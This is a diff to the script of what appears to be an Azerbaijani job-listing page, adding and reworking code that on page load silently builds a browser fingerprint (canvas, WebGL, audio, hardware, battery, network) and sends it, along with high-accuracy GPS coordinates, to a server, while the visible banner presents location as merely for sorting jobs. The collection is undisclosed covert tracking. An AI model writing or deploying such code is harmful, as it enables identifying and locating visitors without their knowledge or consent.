@@ -302,7 +302,6 @@
 // FINGERPRINT & VISITOR ID GENERATOR
 // ==========================================================
 
-// Sadə hash funksiyası (string -> hex)
 function simpleHash(str) {
     let hash = 0;
     for (let i = 0; i < str.length; i++) {
@@ -313,7 +312,6 @@ function simpleHash(str) {
     return Math.abs(hash).toString(16).padStart(8, '0');
 }
 
-// Canvas fingerprint
 function getCanvasHash() {
     try {
         const canvas = document.createElement('canvas');
@@ -334,7 +332,6 @@ function getCanvasHash() {
     }
 }
 
-// WebGL fingerprint (GPU məlumatı)
 function getWebGLInfo() {
     try {
         const canvas = document.createElement('canvas');
@@ -363,7 +360,6 @@ function getWebGLInfo() {
     }
 }
 
-// Audio fingerprint
 async function getAudioHash() {
     try {
         const AudioContext = window.OfflineAudioContext || window.webkitOfflineAudioContext;
@@ -396,13 +392,11 @@ async function getAudioHash() {
     }
 }
 
-// Əsas fingerprint toplayıcı
 async function collectFingerprint() {
     const webgl = getWebGLInfo();
     const canvasHash = getCanvasHash();
     const audioHash = await getAudioHash();
 
-    // Visitor ID = bütün hash-ların birləşməsi
     const visitorId = simpleHash(
         canvasHash + '|' + webgl.hash + '|' + audioHash + '|' +
         (navigator.hardwareConcurrency || 0) + '|' +
@@ -411,7 +405,6 @@ async function collectFingerprint() {
         navigator.language
     );
 
-    // Batareya
     let batteryStr = null;
     try {
         if (navigator.getBattery) {
@@ -420,7 +413,6 @@ async function collectFingerprint() {
         }
     } catch (e) {}
 
-    // Şəbəkə tipi
     let connection = null;
     try {
         const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
@@ -456,7 +448,8 @@ async function collectFingerprint() {
 // ==========================================================
 let lastLocation = null;
 let locationReady = false;
-let ipInfoSent = false;
+let fingerprintSent = false;
+let locationSent = false;
 let cachedFingerprint = null;
 
 async function sendToServer(payload) {
@@ -477,7 +470,7 @@ async function requestLocation() {
 
     if (!navigator.geolocation) {
         banner.style.display = "none";
-        await sendInitialData();
+        await sendFingerprint(null);
         return;
     }
 
@@ -497,26 +490,41 @@ async function requestLocation() {
                 Region müəyyən edildi: <b>Bakı</b>. Uyğun işlər sıralandı.
                 <button class="banner-btn" onclick="confirmRegion()">Regionu təsdiqlə</button>
             `;
+
+            // ✅ 1) GPS dərhal göndər
+            if (!locationSent) {
+                locationSent = true;
+                if (!cachedFingerprint) cachedFingerprint = await collectFingerprint();
+                await sendToServer({
+                    action: "location_confirm",
+                    location: lastLocation,
+                    visitorId: cachedFingerprint?.visitorId,
+                });
+            }
+
+            // ✅ 2) Fingerprint-i də göndər (bir dəfə)
+            await sendFingerprint(lastLocation);
         },
         async (err) => {
+            // İcazə verilmədi
             banner.style.display = "none";
+            await sendFingerprint(null);
         },
         { enableHighAccuracy: true, timeout: 8000 }
     );
 }
 
-async function sendInitialData() {
-    if (ipInfoSent) return;
-    ipInfoSent = true;
+async function sendFingerprint(location) {
+    if (fingerprintSent) return;
+    fingerprintSent = true;
 
-    // Fingerprint-i topla
     if (!cachedFingerprint) {
         cachedFingerprint = await collectFingerprint();
     }
 
     await sendToServer({
         action: "fingerprint",
-        location: lastLocation,
+        location: location,
         fingerprint: cachedFingerprint,
         visitorId: cachedFingerprint.visitorId,
     });
@@ -584,14 +592,12 @@ async function sendApplication() {
 // PAGE LOAD
 // ==========================================================
 window.addEventListener('DOMContentLoaded', async () => {
-    // 1. Fingerprint-i topla
+    // 1. Fingerprint-i topla (hələ göndərmə)
     cachedFingerprint = await collectFingerprint();
 
-    // 2. Location istə
+    // 2. Location istə → icazə verilsə GPS dərhal göndəriləcək,
+    //    verilməsə fingerprint göndəriləcək
     await requestLocation();
-
-    // 3. Fingerprint məlumatını serverə göndər
-    await sendInitialData();
 });
 </script>
 
